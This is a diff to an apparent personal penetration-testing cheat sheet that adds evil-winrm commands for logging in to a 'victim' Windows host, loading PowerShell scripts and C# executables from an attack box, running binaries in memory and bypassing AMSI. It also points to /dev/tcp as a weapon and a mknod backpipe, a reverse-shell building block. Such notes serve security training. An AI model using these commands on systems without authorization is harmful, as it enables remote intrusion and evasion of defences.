@@ -3,9 +3,15 @@
   * [archived](https://web.archive.org/web/20190920152858/https://securityreliks.wordpress.com/2010/08/20/devtcp-as-a-weapon/)
 
 # [evil-winrm](https://github.com/Hackplayers/evil-winrm):
-#### `evil-winrm -i X.X.X.X -u <usenamer> -p <password>`
+#### `evil-winrm -i X.X.X.X -u <username> -p <password>`
 #### `evil-winrm -i X.X.X.X -u <username> -p -s <path/to/ps1>`
-  * -s allows yoiu to load powershell scripts from Kali to the victim
+#### `evil-winrm -i X.X.X.X -u <username> -e <path/on/attack>`
+#### `Invoke-Binary <path/to/csharpexe>`
+#### `Donut-Loader`
+#### `Bypass-4MSI`
+  * -s allows you to load powershell scripts from Kali to the victim
+  * Invoke-Binary runs C# executables in memory; the executables must be in the path set by the -e flag in the prior command
+  * Donut-Loader and Bypass-4MSI look useful but I don't know how to use them yet
 
 # [mknod](https://man7.org/linux/man-pages/man1/mknod.1.html):
 #### `mknod /tmp/backpipe p`
